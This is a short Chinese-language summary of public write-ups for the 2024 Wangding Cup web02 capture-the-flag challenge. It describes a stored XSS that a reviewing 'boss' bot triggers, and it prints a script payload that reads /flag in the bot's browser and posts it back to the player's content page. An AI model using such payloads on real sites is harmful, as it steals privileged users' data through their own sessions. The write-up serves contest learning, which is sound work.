---
title: web02
competition: 网鼎杯
year: 2024
category: Web
tags: [青龙, stored-xss, bot]
sources:
  - https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/
  - https://cn-sec.com/archives/3336366.html
  - https://sechub.in/view/2962999
  - https://mp.weixin.qq.com/s/HhL4lqcL_3EeYg1TDeBOKg
  - https://www.cnblogs.com/backlion/p/18527653
---

# web02

## 题目信息

- 赛事：第四届网鼎杯 2024 线上资格赛 · 青龙组
- 分类：Web
- 题面：登录后得到 `/content/<hash>`。目录扫描还有 `/flag`，直接访问会提示只有 boss 能看。

## 考点

- 存储型 XSS
- 机器人审核时带着权限去读 `/flag`，再写回当前内容页

## 解题思路

任意账号可以登录。页面上有提交、刷新、更新。公开 WP 先试过 SSTI，没有打通。文本框是存储型 XSS，但自己打开只会看到「不是 boss」：点提交之后，才由 boss 去审核这份「起飞任务」。

因此 payload 要等 boss 的浏览器执行：`fetch('/flag')`，再 POST 回自己的 `/content/<hash>`。hash 每局不同，写成当前页面的那条路由。刷新自己的内容页即可看到 flag。完整脚本见原文。

## 关键代码/payload

```text
<script>
fetch('/flag').then(r => r.text()).then(data =>
  fetch('/content/<当前hash>', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'content=' + encodeURIComponent(data)
  }))
</script>
```

## 参考链接

- https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/
- https://cn-sec.com/archives/3336366.html
- https://sechub.in/view/2962999
- https://www.cnblogs.com/backlion/p/18527653

> 本文为对公开 writeup 的归纳总结，版权归原作者所有；请务必阅读原文核对细节。
